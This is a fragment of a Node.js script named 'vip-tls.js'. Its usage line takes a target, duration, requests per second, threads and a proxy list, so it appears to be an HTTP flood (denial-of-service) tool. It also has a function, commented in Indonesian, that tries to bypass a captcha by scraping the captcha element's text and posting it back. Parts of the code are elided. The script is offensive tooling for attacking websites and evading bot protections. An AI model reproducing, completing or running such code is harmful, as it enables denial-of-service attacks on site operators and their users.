 ...
 if (process.argv.length < 7){console.log("node vip-tls.js [TARGET] [TIME] [RPS] [THREAD] proxy.txt");
 }
 const headers = {};
...
async function bypassCaptcha(url) {
  try {
    // Mengirim permintaan GET ke URL target
    const response = await axios.get(url);

    // Mengambil konten HTML dari respons
    const html = response.data;

    // Membuat DOM dari konten HTML
    const dom = new JSDOM(html);

    // Mendapatkan elemen captcha dari DOM
    const captchaElement = dom.window.document.querySelector('.captcha');

    // Mendapatkan nilai captcha dari elemen
    const captchaValue = captchaElement.textContent;

    // Mengirim permintaan POST dengan nilai captcha
    await axios.post(url, { captcha: captchaValue });

    console.log('Captcha berhasil dilewati!');
  } catch (error) {
    console.error('Gagal melewati captcha:', error.message);
  }
} 
